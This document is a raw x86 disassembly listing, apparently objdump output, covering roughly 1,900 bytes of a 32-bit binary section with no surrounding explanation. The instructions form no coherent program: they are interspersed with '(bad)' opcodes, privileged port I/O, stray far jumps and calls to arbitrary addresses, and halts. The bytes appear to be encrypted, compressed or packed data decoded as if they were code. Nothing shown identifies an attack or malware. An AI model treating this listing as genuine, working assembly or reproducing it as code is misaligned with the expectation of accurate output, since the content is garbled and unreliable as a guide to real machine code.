  41b5bc:	lods   eax,DWORD PTR ds:[esi]
  41b5bd:	mov    dl,0x9a
  41b5bf:	call   0x51f998ac
  41b5c4:	mov    BYTE PTR [ebx-0x41],bl
  41b5c7:	sbb    al,0x16
  41b5c9:	sbb    BYTE PTR [ebx+0x7f1e4e5c],cl
  41b5cf:	ins    BYTE PTR es:[edi],dx
  41b5d0:	push   edi
  41b5d1:	les    esi,FWORD PTR [ecx]
  41b5d3:	ss push edi
  41b5d5:	adc    al,0xdb
  41b5d7:	inc    edi
  41b5d8:	jo     0x41b616
  41b5da:	scas   al,BYTE PTR es:[edi]
  41b5db:	lock jb 0x41b636
  41b5de:	sbb    eax,0x7a8f4635
  41b5e3:	fdivr  st,st(3)
  41b5e5:	jo     0x41b5ea
  41b5e7:	fucomi st,st(1)
  41b5e9:	cmp    BYTE PTR [ebp+ebx*1-0x5a],ah
  41b5ed:	(bad)  
  41b5ee:	and    cl,BYTE PTR [ebx+edi*1+0x55]
  41b5f2:	pusha  
  41b5f3:	les    esi,FWORD PTR [ebx+ecx*2]
  41b5f6:	je     0x41b60a
  41b5f8:	les    edi,FWORD PTR [esi+edi*1-0x37]
  41b5fc:	and    DWORD PTR [ecx],edx
  41b5fe:	icebp  
  41b5ff:	scas   al,BYTE PTR es:[edi]
  41b600:	or     esi,DWORD PTR [edx]
  41b602:	pop    ds
  41b603:	ror    bh,cl
  41b605:	sub    BYTE PTR [ebx-0x2fc40991],bh
  41b60b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b60c:	lea    eax,[esi-0x72586d71]
  41b612:	mov    cl,0x87
  41b614:	or     DWORD PTR [ecx+0x650d43c8],ebp
  41b61a:	stos   DWORD PTR es:[edi],eax
  41b61b:	xchg   ebx,eax
  41b61c:	call   DWORD PTR ds:0xfe104a96
  41b622:	call   FWORD PTR [esi+0x13]
  41b625:	lock jecxz 0x41b616
  41b628:	shl    BYTE PTR [edi],1
  41b62a:	lds    ecx,FWORD PTR [ebx]
  41b62c:	pushaw 
  41b62e:	add    bl,dl
  41b630:	aaa    
  41b631:	js     0x41b5b9
  41b633:	mov    ebx,?
  41b635:	dec    esi
  41b636:	adc    al,0x1e
  41b638:	pop    es
  41b639:	out    0x9a,al
  41b63b:	mov    BYTE PTR [ecx-0x6595a069],0xd6
  41b642:	mov    DWORD PTR [ebp+0x53303011],ebp
  41b648:	xlat   BYTE PTR ds:[ebx]
  41b649:	mov    ax,0xe9c1
  41b64d:	dec    ebx
  41b64e:	inc    esi
  41b64f:	in     al,0x6b
  41b651:	or     ecx,DWORD PTR [ecx+0x5b]
  41b654:	mov    al,0x16
  41b656:	mov    cl,0xe4
  41b658:	out    0x20,eax
  41b65a:	cmp    edi,ecx
  41b65c:	nop
  41b65d:	fdiv   QWORD PTR [edx+0x5b7e11d8]
  41b663:	or     al,0xe3
  41b665:	in     eax,0x84
  41b667:	aad    0xda
  41b669:	jb     0x41b647
  41b66b:	pop    ebx
  41b66c:	scas   eax,DWORD PTR es:[edi]
  41b66d:	imul   edx,DWORD PTR [eax+edx*1],0x11faa38a
  41b674:	xchg   ebx,eax
  41b675:	push   0x2e
  41b677:	and    ebp,DWORD PTR es:[ebp+0x42975480]
  41b67e:	out    dx,al
  41b67f:	lea    edi,ds:0x608c48d6
  41b685:	pusha  
  41b686:	pop    ecx
  41b687:	mov    ebp,0x97d72ed2
  41b68c:	xor    eax,0x83db191f
  41b691:	mov    ds:0x5cdc738d,eax
  41b696:	out    0xbf,al
  41b698:	and    edx,DWORD PTR [ebp+0x3c16939f]
  41b69e:	cmp    ebp,esp
  41b6a0:	jmp    0x93b06c35
  41b6a5:	push   edi
  41b6a6:	rol    dh,1
  41b6a8:	ja     0x41b637
  41b6aa:	dec    edx
  41b6ab:	aam    0xd1
  41b6ad:	jmp    0x4d6ee3c5
  41b6b2:	popa   
  41b6b3:	mov    edi,0x72dd5f91
  41b6b8:	and    ecx,ecx
  41b6ba:	add    DWORD PTR [ebp+0x41a0090c],ebx
  41b6c0:	leave  
  41b6c1:	not    esp
  41b6c3:	pop    ebp
  41b6c4:	mov    ah,0xdd
  41b6c6:	addr16 ss push edi
  41b6c9:	ja     0x41b71d
  41b6cb:	mov    ah,0x11
  41b6cd:	dec    esi
  41b6ce:	mov    edx,0x65a0879c
  41b6d3:	(bad)  
  41b6d4:	aaa    
  41b6d5:	xor    ebp,0x35
  41b6d8:	dec    esi
  41b6d9:	iret   
  41b6da:	not    ah
  41b6dc:	lods   al,BYTE PTR ds:[esi]
  41b6dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6de:	shr    DWORD PTR [edx+0x1062f098],1
  41b6e4:	fistp  QWORD PTR [edx]
  41b6e6:	enterw 0x6e40,0xdc
  41b6eb:	enter  0xc5ad,0xe3
  41b6ef:	test   BYTE PTR [esi],bl
  41b6f1:	mov    ds:0x325b917a,eax
  41b6f6:	(bad)  
  41b6f7:	adc    DWORD PTR [ecx+0x258d0fcc],ecx
  41b6fd:	(bad)  
  41b6fe:	sti    
  41b6ff:	dec    edx
  41b700:	xor    DWORD PTR [edi],esp
  41b702:	inc    ebp
  41b703:	je     0x41b728
  41b705:	pop    esp
  41b706:	out    dx,al
  41b707:	jecxz  0x41b71f
  41b709:	fisubr WORD PTR [edx-0x13]
  41b70c:	jl     0x41b6fa
  41b70e:	push   edx
  41b70f:	imul   ebp,DWORD PTR [esi+eiz*1],0x38
  41b713:	retf   
  41b714:	je     0x41b729
  41b716:	pop    ds
  41b717:	div    dl
  41b719:	cmp    ecx,eax
  41b71b:	sub    ebx,DWORD PTR [ebx-0x64c9d84f]
  41b721:	nop
  41b722:	jb     0x41b732
  41b724:	int3   
  41b725:	push   ds
  41b726:	cs int 0xdc
  41b729:	(bad)  
  41b72a:	mov    ebx,DWORD PTR [esi-0x249b10]
  41b730:	in     eax,dx
  41b731:	jae    0x41b6ee
  41b733:	mov    eax,ds:0x946788c5
  41b738:	xchg   ecx,eax
  41b739:	fnsave [ebp+edx*1-0x5836cb68]
  41b740:	mov    ch,0x9f
  41b742:	cs mov cl,0xce
  41b745:	(bad)  
  41b746:	int    0x84
  41b748:	in     al,dx
  41b749:	add    esi,DWORD PTR [ecx-0x5788ea71]
  41b74f:	mov    al,ds:0xbfef17e0
  41b754:	pop    ebx
  41b755:	call   FWORD PTR [esi+0x1032fc3c]
  41b75b:	add    eax,0x82f18371
  41b760:	and    al,0x17
  41b762:	add    eax,0x57eaa588
  41b767:	dec    edi
  41b768:	xchg   BYTE PTR [ecx-0x52f6e06a],bl
  41b76e:	push   ds
  41b76f:	pop    edi
  41b770:	pusha  
  41b771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b772:	repnz out dx,eax
  41b774:	es ja  0x41b758
  41b777:	xchg   edi,eax
  41b778:	sti    
  41b779:	lock mov al,ds:0x98d71e31
  41b77f:	(bad)  
  41b780:	sti    
  41b781:	add    BYTE PTR [ebp+0x21bc08cc],ch
  41b787:	call   0xfbb2:0xb30df0f5
  41b78e:	push   ds
  41b78f:	jp     0x41b775
  41b791:	xor    ecx,ebx
  41b793:	iret   
  41b794:	sbb    ecx,DWORD PTR [ecx+eax*4+0x36f37efe]
  41b79b:	loop   0x41b7c2
  41b79d:	push   0xfffffffc
  41b79f:	std    
  41b7a0:	mov    cl,dh
  41b7a2:	cmp    BYTE PTR [ecx],bl
  41b7a4:	mov    eax,0x7d2ca61c
  41b7a9:	add    DWORD PTR [esi-0x5b],edx
  41b7ac:	mov    cl,0xb0
  41b7ae:	repnz sub esp,DWORD PTR [ecx+0x619b1059]
  41b7b5:	xchg   edx,eax
  41b7b6:	test   al,0x31
  41b7b8:	xor    ebx,DWORD PTR [esp+edx*2-0x69159caa]
  41b7bf:	fstp   DWORD PTR [edi+0x15]
  41b7c2:	jg     0x41b752
  41b7c4:	or     al,0x4f
  41b7c6:	xchg   ebx,eax
  41b7c7:	rcl    DWORD PTR [bx+di+0x46],0xb1
  41b7cc:	(bad)  
  41b7cd:	cld    
  41b7ce:	xlat   BYTE PTR ds:[ebx]
  41b7cf:	jg     0x41b822
  41b7d1:	xchg   ecx,eax
  41b7d2:	arpl   WORD PTR [edi-0x2a],sp
  41b7d5:	fmul   DWORD PTR [edi+0x25]
  41b7d8:	call   0xf376:0x7879e153
  41b7df:	inc    esi
  41b7e0:	pushf  
  41b7e1:	push   esi
  41b7e2:	or     eax,0x435df5be
  41b7e7:	pop    edx
  41b7e8:	push   ebx
  41b7e9:	xchg   ebx,eax
  41b7ea:	repz std 
  41b7ec:	or     ebx,DWORD PTR [eax]
  41b7ee:	das    
  41b7ef:	out    0x73,al
  41b7f1:	in     al,dx
  41b7f2:	dec    ecx
  41b7f3:	sub    eax,0x8b5ce66e
  41b7f8:	ror    cl,1
  41b7fa:	sub    bl,BYTE PTR [ebx+0x5867953]
  41b800:	enter  0x576b,0xc8
  41b804:	or     DWORD PTR [ecx+edi*8-0x52094b9],edi
  41b80b:	cdq    
  41b80c:	mov    dl,0x6f
  41b80e:	jge    0x41b7a1
  41b810:	xchg   edx,eax
  41b811:	(bad)  
  41b812:	nop
  41b813:	out    0x66,eax
  41b815:	push   es
  41b816:	and    cl,BYTE PTR [eax+0x2d]
  41b819:	push   ebp
  41b81a:	test   DWORD PTR [edx-0x6d],esi
  41b81d:	cmp    al,0x9f
  41b81f:	pop    esi
  41b820:	ins    BYTE PTR es:[edi],dx
  41b821:	dec    ebp
  41b822:	test   al,0xb1
  41b824:	(bad)  
  41b825:	or     DWORD PTR [eax+0x1d],esp
  41b828:	lods   eax,DWORD PTR ds:[esi]
  41b829:	sub    al,0x37
  41b82b:	data16 fld TBYTE PTR [eax]
  41b82e:	std    
  41b82f:	dec    esp
  41b830:	mov    edx,DWORD PTR [ecx+0xf]
  41b833:	lods   al,BYTE PTR ds:[esi]
  41b834:	cld    
  41b835:	pushf  
  41b836:	cmc    
  41b837:	rcr    DWORD PTR [esi-0x3],1
  41b83a:	mov    ebp,DWORD PTR [esi-0x34b87af7]
  41b840:	add    al,BYTE PTR [edi-0x37]
  41b843:	xor    BYTE PTR [ebp+0x3c],dh
  41b846:	or     BYTE PTR [ebx-0x3a],dl
  41b849:	jecxz  0x41b897
  41b84b:	jns    0x41b874
  41b84d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b84e:	mov    al,ds:0x65f52d17
  41b853:	icebp  
  41b854:	retf   
  41b855:	sahf   
  41b856:	sbb    DWORD PTR [eax+0x56098818],ecx
  41b85c:	push   edi
  41b85d:	xor    al,0x2a
  41b85f:	xor    DWORD PTR [ebp-0xa217257],esi
  41b865:	shl    al,0x1a
  41b868:	das    
  41b869:	xchg   ecx,eax
  41b86a:	jge    0x41b8e1
  41b86c:	cmp    BYTE PTR [esi+ecx*8],bh
  41b86f:	out    0x3b,al
  41b871:	or     cl,BYTE PTR [esi+0x2d]
  41b874:	inc    edx
  41b875:	inc    ebx
  41b876:	jns    0x41b8c6
  41b878:	jns    0x41b8e0
  41b87a:	xlat   BYTE PTR ds:[ebx]
  41b87b:	or     dl,BYTE PTR [ecx-0x35]
  41b87e:	js     0x41b82f
  41b880:	out    dx,eax
  41b881:	mov    eax,ds:0x276b737
  41b886:	dec    eax
  41b887:	inc    edx
  41b888:	popf   
  41b889:	test   eax,0x2e8eeac9
  41b88e:	sub    BYTE PTR [esi+0x66e524ba],0x98
  41b895:	pusha  
  41b896:	inc    ecx
  41b897:	sub    dh,al
  41b899:	inc    esp
  41b89a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b89b:	xor    DWORD PTR [edi+ebp*8+0x765b8d54],esi
  41b8a2:	adc    dl,dh
  41b8a4:	fs in  al,dx
  41b8a6:	ins    BYTE PTR es:[edi],dx
  41b8a7:	pop    esp
  41b8a8:	push   edi
  41b8a9:	mov    bl,BYTE PTR [ecx]
  41b8ab:	sbb    eax,0xe9f875f5
  41b8b0:	mov    al,0x99
  41b8b2:	ins    BYTE PTR es:[edi],dx
  41b8b3:	(bad)  
  41b8b4:	int3   
  41b8b5:	adc    DWORD PTR [edi+0x47],0x59
  41b8b9:	push   edi
  41b8ba:	inc    esp
  41b8bb:	jl     0x41b90b
  41b8bd:	test   ah,dl
  41b8bf:	test   al,0x91
  41b8c1:	sub    ebp,DWORD PTR [ebx-0x3bd9d1d4]
  41b8c7:	rcr    DWORD PTR [ebp+0x44],cl
  41b8ca:	jmp    0xe00a465c
  41b8cf:	pop    esi
  41b8d0:	adc    al,0xe4
  41b8d2:	push   edi
  41b8d3:	retf   
  41b8d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8d5:	cli    
  41b8d6:	scas   al,BYTE PTR es:[edi]
  41b8d7:	in     eax,0xb5
  41b8d9:	xor    eax,0xca01ba4a
  41b8de:	dec    ebp
  41b8df:	mov    WORD PTR [ecx-0x13],?
  41b8e2:	pop    ebx
  41b8e3:	mov    esp,0xfeb7ccac
  41b8e8:	jno    0x41b8f8
  41b8ea:	adc    eax,DWORD PTR [edi]
  41b8ec:	sbb    esi,ecx
  41b8ee:	aam    0x2f
  41b8f0:	loop   0x41b8f8
  41b8f2:	cwde   
  41b8f3:	fmul   DWORD PTR [eax-0x5a79d72b]
  41b8f9:	xchg   esp,eax
  41b8fa:	ss mov esp,0x4f6b6c3d
  41b900:	mov    edi,0xf9b84f4b
  41b905:	cmp    dh,BYTE PTR [ebx]
  41b907:	push   esp
  41b908:	mov    ecx,0xfd90d382
  41b90d:	add    eax,0xaf6aab88
  41b912:	clc    
  41b913:	inc    ecx
  41b914:	imul   esp,DWORD PTR [esi+0x289df6ff],0x54c60c38
  41b91e:	mov    ebp,0xb6193d4
  41b923:	mov    bl,0x10
  41b925:	mov    ebp,0x72c53787
  41b92a:	cmc    
  41b92b:	enter  0x9731,0xe1
  41b92f:	popa   
  41b930:	or     BYTE PTR [ebx+0x68],dh
  41b933:	(bad)  
  41b934:	mov    eax,0xb890c4a3
  41b939:	xchg   ebp,eax
  41b93a:	push   ebp
  41b93b:	lods   eax,DWORD PTR ds:[esi]
  41b93c:	push   es
  41b93d:	je     0x41b8dc
  41b93f:	jb     0x41b8e1
  41b941:	inc    eax
  41b942:	mov    eax,ds:0x70316f17
  41b947:	pop    ebp
  41b948:	pop    esp
  41b949:	in     eax,dx
  41b94a:	enter  0x1b8e,0x52
  41b94e:	xchg   ebx,eax
  41b94f:	jno    0x41b9ad
  41b951:	inc    esi
  41b952:	(bad)  
  41b953:	xchg   DWORD PTR [ecx+0x21],eax
  41b956:	aaa    
  41b957:	cmp    eax,0xaa88e306
  41b95c:	push   edx
  41b95d:	jle    0x41b9b5
  41b95f:	ret    0x87a9
  41b962:	mov    esp,0x31de8e25
  41b967:	cmp    dl,al
  41b969:	rol    DWORD PTR [esi-0x56],cl
  41b96c:	movntps XMMWORD PTR [ebx+eiz*1],xmm1
  41b970:	lock mov edi,0x7a714b81
  41b976:	jmp    0x8afe:0xbd7d00b6
  41b97d:	or     dl,BYTE PTR [ecx+0xa17774e]
  41b983:	pusha  
  41b984:	mov    dh,0xd9
  41b986:	mov    eax,ebp
  41b988:	pop    esp
  41b989:	dec    esp
  41b98a:	pop    ss
  41b98b:	xchg   ebp,eax
  41b98c:	mov    bl,0x70
  41b98e:	loopne 0x41b97c
  41b990:	and    edx,ecx
  41b992:	(bad)
  41b996:	ss ds dec edx
  41b999:	jecxz  0x41b95a
  41b99b:	add    dl,BYTE PTR [edx]
  41b99d:	neg    BYTE PTR [edx-0x57]
  41b9a0:	sub    ebx,DWORD PTR [edx]
  41b9a2:	xor    BYTE PTR [ebp-0x70d39902],bl
  41b9a8:	test   BYTE PTR [edi-0x50066697],dh
  41b9ae:	shl    eax,0xe7
  41b9b1:	pop    ecx
  41b9b2:	mov    eax,ds:0x27583749
  41b9b7:	xchg   edi,eax
  41b9b8:	ins    BYTE PTR es:[edi],dx
  41b9b9:	xchg   BYTE PTR [ecx+edx*2+0x17],bl
  41b9bd:	jno    0x41b97e
  41b9bf:	fwait
  41b9c0:	mov    edi,0x6f488fb4
  41b9c5:	cli    
  41b9c6:	mov    al,ds:0x20f3ec5
  41b9cb:	or     DWORD PTR [eax-0x7],esi
  41b9ce:	out    dx,eax
  41b9cf:	push   cs
  41b9d0:	shr    DWORD PTR [edi-0x35],0x26
  41b9d4:	cmp    BYTE PTR [ebx-0x76deb788],ah
  41b9da:	es mov dl,0x54
  41b9dd:	lock sti 
  41b9df:	into   
  41b9e0:	dec    ecx
  41b9e1:	fst    DWORD PTR [esi]
  41b9e3:	xor    BYTE PTR [ebx],bh
  41b9e5:	lods   al,BYTE PTR ds:[esi]
  41b9e6:	xor    cl,BYTE PTR [edx+0x50961748]
  41b9ec:	fimul  DWORD PTR [ebx-0x2c]
  41b9ef:	in     eax,dx
  41b9f0:	dec    edx
  41b9f1:	inc    ebp
  41b9f2:	(bad)  
  41b9f3:	data16 jle 0x41ba0d
  41b9f6:	stc    
  41b9f7:	xchg   DWORD PTR [ebx],esp
  41b9f9:	(bad)  
  41b9fa:	mov    al,ds:0xfbc24e01
  41b9ff:	cmc    
  41ba00:	sub    dh,dh
  41ba02:	enter  0xa646,0xa4
  41ba06:	dec    edi
  41ba07:	rsqrtps xmm7,XMMWORD PTR [ecx-0x68]
  41ba0b:	test   al,0xe4
  41ba0d:	xchg   edx,eax
  41ba0e:	div    BYTE PTR [ebp+0x7b660e7e]
  41ba14:	jae    0x9433c7b8
  41ba1a:	test   BYTE PTR [ebx],dh
  41ba1c:	into   
  41ba1d:	pop    es
  41ba1e:	int    0x5f
  41ba20:	lea    esp,[edi]
  41ba22:	stos   BYTE PTR es:[edi],al
  41ba23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba24:	jl     0x41b9d2
  41ba26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba27:	es xor al,0x6b
  41ba2a:	mov    cl,dl
  41ba2c:	pushf  
  41ba2d:	push   es
  41ba2e:	xchg   ebx,eax
  41ba2f:	pop    edx
  41ba30:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41ba32:	cdq    
  41ba33:	mov    ch,0x26
  41ba35:	mov    edi,0x66ebd4ae
  41ba3a:	jecxz  0x41bab7
  41ba3c:	or     BYTE PTR [esi-0x4e],bl
  41ba3f:	or     eax,0x20f967d8
  41ba44:	cmc    
  41ba45:	lds    edi,FWORD PTR [esi]
  41ba47:	xchg   esp,eax
  41ba48:	pop    ebx
  41ba49:	inc    esi
  41ba4a:	jbe    0x41ba75
  41ba4c:	mov    WORD PTR ds:0x9edb05b5,?
  41ba52:	and    al,BYTE PTR [edi+0x11]
  41ba55:	fwait
  41ba56:	cmp    al,0xaf
  41ba58:	imul   edi,DWORD PTR [esi+0x32856ceb],0xffffffbc
  41ba5f:	add    ah,cl
  41ba61:	mov    ds:0x5a2c2783,eax
  41ba66:	hlt    
  41ba67:	(bad)  
  41ba68:	(bad)  
  41ba69:	popa   
  41ba6a:	mov    eax,ds:0x7df5a1d
  41ba6f:	push   es
  41ba70:	test   eax,0x5fd3f110
  41ba75:	ret    
  41ba76:	add    ch,BYTE PTR [ecx]
  41ba78:	or     BYTE PTR [ecx+0x2e798489],0x1c
  41ba7f:	sbb    BYTE PTR [ebx+edx*2],0x1b
  41ba83:	icebp  
  41ba84:	and    esp,DWORD PTR [esi-0x4c77e5f]
  41ba8a:	stos   BYTE PTR es:[edi],al
  41ba8b:	jbe    0x41ba9e
  41ba8d:	mov    WORD PTR [ebx+0x25],dx
  41ba91:	push   edi
  41ba92:	fadd   QWORD PTR [esi]
  41ba95:	jg     0x41ba4e
  41ba97:	in     eax,dx
  41ba98:	cmp    BYTE PTR [eax-0x105b654c],cl
  41ba9e:	lea    esi,[ebx-0x35]
  41baa1:	pop    ss
  41baa2:	sub    BYTE PTR [edx+0x7],bh
  41baa5:	xchg   ebx,eax
  41baa6:	ins    BYTE PTR es:[edi],dx
  41baa7:	and    DWORD PTR [ebp+0x747695fd],eax
  41baad:	sti    
  41baae:	inc    edi
  41baaf:	and    ebp,esi
  41bab1:	xchg   edi,edi
  41bab3:	test   eax,0x15709485
  41bab8:	or     DWORD PTR [ecx+0x1b2f81ac],ecx
  41babe:	mov    ah,BYTE PTR [edx+ebp*1+0x4badf923]
  41bac5:	xor    esi,DWORD PTR [ecx+0x18]
  41bac8:	mov    ebp,0x99726a81
  41bacd:	inc    esi
  41bace:	rcl    DWORD PTR [ebx-0x70ba8e88],cl
  41bad4:	and    edx,DWORD PTR [ecx+ebp*4-0x491fafb4]
  41badb:	hlt    
  41badc:	loopne 0x41bae2
  41bade:	inc    esi
  41badf:	loop   0x41bb1a
  41bae1:	aas    
  41bae2:	xlat   BYTE PTR ds:[ebx]
  41bae3:	xor    cl,BYTE PTR [edx]
  41bae5:	outs   dx,BYTE PTR ds:[esi]
  41bae6:	push   eax
  41bae7:	and    al,0x25
  41bae9:	inc    esi
  41baea:	test   BYTE PTR [eax+0x1c],al
  41baed:	lods   eax,DWORD PTR ds:[esi]
  41baee:	and    dl,dh
  41baf0:	mov    ah,BYTE PTR [edi+0x68]
  41baf3:	sbb    BYTE PTR [eax-0xc137b48],ch
  41baf9:	aad    0xe1
  41bafb:	mov    edx,0x85eb3582
  41bb00:	clc    
  41bb01:	dec    eax
  41bb02:	fist   WORD PTR [edx-0x7d]
  41bb05:	jbe    0x41ba8a
  41bb07:	inc    esp
  41bb08:	jnp    0x41bb29
  41bb0a:	push   esi
  41bb0b:	or     dl,cl
  41bb0d:	xchg   esp,eax
  41bb0e:	cdq    
  41bb0f:	or     DWORD PTR [ecx-0x32fb06a7],0xffffffdb
  41bb16:	aas    
  41bb17:	mov    ebp,0x428c9243
  41bb1c:	(bad)  
  41bb1e:	push   esi
  41bb1f:	sbb    eax,0x3ae65ee3
  41bb24:	mov    bl,0xaf
  41bb26:	adc    edi,ebp
  41bb28:	into   
  41bb29:	pop    edi
  41bb2a:	test   BYTE PTR [ebx-0x6a],ch
  41bb2d:	sar    DWORD PTR [edx+0x50],1
  41bb30:	cmovg  eax,DWORD PTR [ecx]
  41bb33:	cli    
  41bb34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb35:	imul   eax,DWORD PTR [edi+0xfc2d1a7],0xffffffa1
  41bb3c:	inc    DWORD PTR [ebp+0x21]
  41bb3f:	(bad)  
  41bb40:	dec    ebp
  41bb42:	jns    0x41bba4
  41bb44:	ins    BYTE PTR es:[edi],dx
  41bb45:	lods   al,BYTE PTR ds:[esi]
  41bb46:	das    
  41bb47:	lds    ecx,FWORD PTR [ebp-0x6099c74]
  41bb4d:	in     eax,dx
  41bb4e:	mov    esp,0x4d8fd0bb
  41bb53:	rcl    BYTE PTR [edx+0xbe46857],0x63
  41bb5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb5b:	inc    ebx
  41bb5c:	pop    ds
  41bb5d:	sbb    BYTE PTR [edx-0xb2a3b7a],dl
  41bb63:	cmp    DWORD PTR [esi-0x77e323c4],0xfa6f49ff
  41bb6d:	jl     0x41bbc7
  41bb6f:	mov    ebx,0x51a4261b
  41bb74:	shl    DWORD PTR [eax],0xea
  41bb77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb78:	jmp    0x2c25dbe2
  41bb7d:	repnz mov bh,0xfc
  41bb80:	pop    ebp
  41bb81:	data16 ror BYTE PTR ds:0x7b8f33d0,cl
  41bb88:	hlt    
  41bb89:	das    
  41bb8a:	hlt    
  41bb8b:	mov    esp,ebp
  41bb8d:	add    DWORD PTR [ecx+0x536383cb],edi
  41bb93:	pop    ss
  41bb94:	cdq    
  41bb95:	mov    esp,0x713571ad
  41bb9a:	cli    
  41bb9b:	mov    bh,0x6a
  41bb9d:	mov    ch,0x13
  41bb9f:	aas    
  41bba0:	mov    esp,0x89558397
  41bba5:	jns    0x41bbae
  41bba7:	push   ss
  41bba8:	pop    ss
  41bba9:	jnp    0x41bc21
  41bbab:	repnz lock jecxz 0x41bb6f
  41bbaf:	add    ebp,esp
  41bbb1:	shr    ebp,cl
  41bbb3:	xchg   esp,eax
  41bbb4:	and    al,BYTE PTR [ebx+0x7e90e424]
  41bbba:	nop
  41bbbb:	jmp    0x3a79:0x531420d7
  41bbc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbc3:	call   0xa3f86624
  41bbc8:	ds mov ebp,0xf3b9001f
  41bbcf:	jp     0x41bc40
  41bbd1:	fwait
  41bbd2:	mov    dl,0xa1
  41bbd4:	in     eax,dx
  41bbd5:	pushf  
  41bbd6:	and    BYTE PTR [edx],ah
  41bbd8:	aam    0x5a
  41bbda:	xchg   edx,eax
  41bbdb:	xor    BYTE PTR [esi],cl
  41bbdd:	inc    ebx
  41bbde:	cdq    
  41bbdf:	scas   eax,DWORD PTR es:[edi]
  41bbe0:	add    DWORD PTR [esi+0x6],edi
  41bbe3:	stos   BYTE PTR es:[edi],al
  41bbe4:	(bad)  
  41bbe5:	adc    DWORD PTR [esp+esi*2+0x63f4d2cd],edi
  41bbec:	mov    ebx,0x62fad9fd
  41bbf1:	or     edx,DWORD PTR [esi+ecx*1+0x31]
  41bbf5:	mov    al,ds:0xfae71dda
  41bbfa:	xchg   edx,eax
  41bbfb:	xchg   ebx,eax
  41bbfc:	push   esp
  41bbfd:	(bad)  
  41bbfe:	mov    ch,0xda
  41bc00:	out    dx,eax
  41bc01:	nop
  41bc02:	jmp    0xf6fd85aa
  41bc07:	push   ecx
  41bc08:	dec    ecx
  41bc09:	jmp    FWORD PTR [ebp+0x6506206e]
  41bc0f:	test   eax,0x2992fdce
  41bc14:	out    dx,eax
  41bc15:	clc    
  41bc16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc17:	call   DWORD PTR [esi]
  41bc19:	and    BYTE PTR [esi-0x6b84b826],bh
  41bc1f:	pop    ebx
  41bc20:	jae    0x41bbe9
  41bc22:	call   0xf5ccba5e
  41bc27:	hlt    
  41bc28:	out    0x42,eax
  41bc2a:	push   edi
  41bc2b:	inc    esp
  41bc2c:	out    0xad,eax
  41bc2e:	jbe    0x41bc5e
  41bc30:	jmp    0x8ac8:0xdaade93d
  41bc37:	jl     0x41bc7b
  41bc39:	icebp  
  41bc3a:	je     0x41bc8f
  41bc3c:	bound  edx,QWORD PTR [edx+edi*1-0x3c3e5803]
  41bc43:	adc    al,0xec
  41bc45:	adc    al,0xe2
  41bc47:	dec    esp
  41bc48:	rcr    BYTE PTR [ebx+0x18],0x30
  41bc4c:	xchg   edi,eax
  41bc4d:	pusha  
  41bc4e:	mov    ecx,0x8accb6
  41bc53:	mov    ch,0x2c
  41bc55:	retf   0xfb7c
  41bc58:	outs   dx,DWORD PTR ds:[esi]
  41bc59:	adc    BYTE PTR [esi+0x34],0x1c
  41bc5d:	push   ss
  41bc5e:	ret    0xed0
  41bc61:	sbb    al,bl
  41bc63:	cs fcomp st(4)
  41bc66:	je     0x41bbf8
  41bc68:	and    ah,dh
  41bc6a:	mov    eax,ds:0x691920f5
  41bc6f:	cmp    edi,DWORD PTR [eax+0x1696f5d5]
  41bc75:	pop    ebp
  41bc76:	mov    dh,0x48
  41bc78:	pop    esp
  41bc79:	jmp    FWORD PTR [ecx+ebp*8]
  41bc7c:	loope  0x41bcb8
  41bc7e:	sti    
  41bc7f:	adc    edx,DWORD PTR [ecx+0x1d59f228]
  41bc85:	enter  0x9075,0xd3
  41bc89:	xchg   ebx,eax
  41bc8a:	adc    BYTE PTR [esi+0x21f93689],bh
  41bc90:	call   0x1f47f106
  41bc95:	add    al,0x9d
  41bc97:	sub    DWORD PTR [ebx+0x32],edx
  41bc9a:	mov    eax,esi
  41bc9c:	pop    DWORD PTR ds:0xf43ef5fb
  41bca2:	rcl    ecx,cl
  41bca4:	das    
  41bca5:	ret    0xa288
  41bca8:	fisttp QWORD PTR [ebx+0x4fbcc663]
  41bcae:	push   ss
  41bcaf:	fmul   DWORD PTR [ebp+ebp*4+0x3f82fea6]
  41bcb6:	jns    0x41bd2d
  41bcb8:	inc    esp
  41bcb9:	loope  0x41bc6f
  41bcbb:	pop    edx
  41bcbc:	pop    ds
  41bcbd:	or     bl,cl
  41bcbf:	ud1    esp,DWORD PTR [di]
  41bcc3:	(bad)  
  41bcc4:	cli    
  41bcc5:	jb     0x41bca2
  41bcc7:	daa    
  41bcc8:	mov    ds:0x3ef2f0c6,eax
  41bccd:	(bad)  
  41bcce:	out    dx,eax
  41bccf:	jnp    0x41bcb9
  41bcd1:	cmp    eax,0x59b2458f
  41bcd6:	bound  esi,QWORD PTR [edi-0x39256bab]
  41bcdc:	aaa    
  41bcdd:	sub    DWORD PTR [esi-0x354f927a],ecx
  41bce3:	push   ebp
  41bce4:	sbb    al,0x3c
  41bce6:	mov    es,WORD PTR [esi-0x2037e767]
  41bcec:	push   es
  41bced:	push   ds
  41bcee:	enter  0x2e64,0x2d
  41bcf2:	sar    DWORD PTR [ebx+0x18],0xc8
  41bcf6:	popa   
  41bcf7:	inc    edx
  41bcf8:	sbb    dh,BYTE PTR ds:0x82ff05b1
  41bcfe:	sbb    ebx,DWORD PTR [ecx+0xc]
  41bd01:	jg     0x41bc9c
  41bd03:	xchg   edx,eax
  41bd04:	imul   ebp,esi,0x14
  41bd07:	xchg   esi,eax
  41bd08:	pop    ecx
  41bd09:	adc    al,0x67
  41bd0b:	imul   esp,esp,0xf79c9d96
  41bd11:	pop    esp
  41bd12:	pop    ds
  41bd13:	iret   
  41bd14:	(bad)  
  41bd15:	jnp    0x41bd65
  41bd17:	js     0x41bd94
  41bd19:	mov    esp,0x417cb3cd
  41bd1e:	(bad)  
